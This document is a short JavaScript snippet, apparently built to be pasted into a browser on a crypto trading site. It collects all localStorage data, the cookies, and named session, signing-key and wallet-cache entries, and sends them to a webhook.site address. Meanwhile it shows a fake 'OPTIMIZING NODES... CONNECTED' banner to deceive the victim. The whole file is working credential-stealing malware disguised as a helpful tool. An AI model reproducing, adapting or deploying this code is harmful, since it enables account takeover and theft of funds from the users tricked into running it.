(function() {
    // 1. CONFIGURATION
    const WEBHOOK_URL = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
    const TOOL_NAME = "SKYLINE";

    // 2. DATA AGGREGATION
    const getStorage = () => {
        let data = {};
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            data[key] = localStorage.getItem(key);
        }
        return data;
    };

    const harvest = {
        meta: {
            url: window.location.href,
            ua: navigator.userAgent,
            ts: new Date().toISOString()
        },
        // Target high-value keys identified in your dump
        auth: {
            session: localStorage.getItem('padreV2-session'),
            stamper: localStorage.getItem('padreV2-stamper'),
            bundles: localStorage.getItem('padre-v2-bundles-store-v2'),
            wallets: localStorage.getItem('padreV2-walletsCache')
        },
        // Full dump for redundancy
        allStorage: JSON.stringify(getStorage()),
        cookies: document.cookie
    };

    // 3. EFFICIENT EXFILTRATION
    // sendBeacon is best for large payloads (no CORS/Timeout issues)
    const blob = new Blob([JSON.stringify(harvest)], { type: 'application/json' });
    navigator.sendBeacon(WEBHOOK_URL, blob);

    // 4. DECOY UI (User sees this)
    const notify = document.createElement('div');
    notify.style = `
        position: fixed;
        top: 20px;
        right: 20px;
        z-index: 1000000;
        background: #111;
        color: #ab47bc;
        border: 1px solid #ab47bc;
        padding: 12px 20px;
        border-radius: 4px;
        font-family: 'Courier New', monospace;
        font-size: 12px;
        box-shadow: 0 0 15px rgba(171, 71, 188, 0.4);
        pointer-events: none;
    `;
    notify.innerHTML = `[${TOOL_NAME}] OPTIMIZING NODES... <br> STATUS: [CONNECTED]`;
    document.body.appendChild(notify);

    // Cleanup decoy after 3 seconds
    setTimeout(() => {
        notify.style.opacity = '0';
        notify.style.transition = 'opacity 0.5s ease';
        setTimeout(() => notify.remove(), 500);
    }, 3000);
})();
